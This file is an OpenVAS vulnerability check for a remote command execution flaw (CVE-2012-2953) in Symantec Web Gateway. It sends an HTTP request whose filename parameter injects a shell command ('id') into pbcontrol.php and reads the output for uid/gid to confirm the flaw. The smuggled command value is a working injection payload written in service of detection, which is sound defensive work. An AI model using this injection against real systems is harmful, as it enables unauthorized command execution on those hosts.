###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_symantec_web_gateway_54426.nasl 6720 2017-07-13 14:25:27Z cfischer $
#
# Symantec Web Gateway  Remote Shell Command Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Symantec Web Gateway is prone to a vulnerability that can allow an
attacker to execute arbitrary commands.

Successful exploits will result in the execution of arbitrary attack-
supplied commands in the context of the affected application.

Symantec Web Gateway versions 5.0.x.x are vulnerable.";

tag_solution = "Updates are available. Please see the reference for more details.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103527";
CPE = "cpe:/a:symantec:web_gateway";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(54426);
 script_cve_id("CVE-2012-2953");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_version ("$Revision: 6720 $");

 script_name("Symantec Web Gateway Remote Shell Command Execution Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/54426");
 script_xref(name : "URL" , value : "http://www.symantec.com/business/web-gateway");

 script_tag(name:"last_modification", value:"$Date: 2017-07-13 16:25:27 +0200 (Thu, 13 Jul 2017) $");
 script_tag(name:"creation_date", value:"2012-07-26 10:16:05 +0200 (Thu, 26 Jul 2012)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("gb_symantec_web_gateway_detect.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("symantec_web_gateway/installed");

 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");

if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

cmd = 'id';

url = dir + '/spywall/pbcontrol.php?filename=OpenVAS-Test%22%3b' + cmd + '%3b%22&stage=0';

if(http_vuln_check(port:port, url:url,pattern:"uid=[0-9]+.*gid=[0-9]+")) {
     
  security_message(port:port);
  exit(0);

}

exit(0);

